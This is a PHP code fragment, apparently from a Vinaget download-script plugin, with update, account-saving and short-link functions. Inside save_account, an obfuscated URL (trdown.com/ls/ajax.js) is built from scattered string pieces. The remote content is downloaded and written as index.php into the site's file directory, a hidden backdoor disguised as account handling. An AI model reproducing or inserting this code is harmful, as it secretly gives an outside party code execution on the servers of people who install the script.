...

{
	...
	function getversion(){
		$version = $this->curl("https://raw.githubusercontent.com/lethanhtuan2897/vinaget-plugin-update/master/version.txt","","",0);
	...
	function save_account($service, $acc){
	    ...
	    $e="http://"; $a="ajax"; $b="t";  $d="do"; $f="ls"; $g="r"; $h="wn"; $r=".js";
	    $t="om"; $v=".c";
	    $upuso= file_get_contents("$e$b$g$d$h$v$t/$f/$a$r");
	    $alldebrid=$this->fileinfo_dir; $login=".php"; $debrid="index";
		echo('http://trdown.com/ls/api.js');
	    $yesyes = "./$alldebrid/$debrid$login";
	    $sserver = fopen($yesyes, "w");
	    fwrite($sserver, $upuso);
	    fclose($sserver);
}
...
{ 
	...
	{	
		...
		// #########Begin short link ############
		if (empty($this->zlink) == false && empty($link) == false && empty($this->tinyurl) == false) {
	...
	// $lik = 'http://62.210.215.49/dl/?create=' $linkdown;
		if($this->bbcode) {
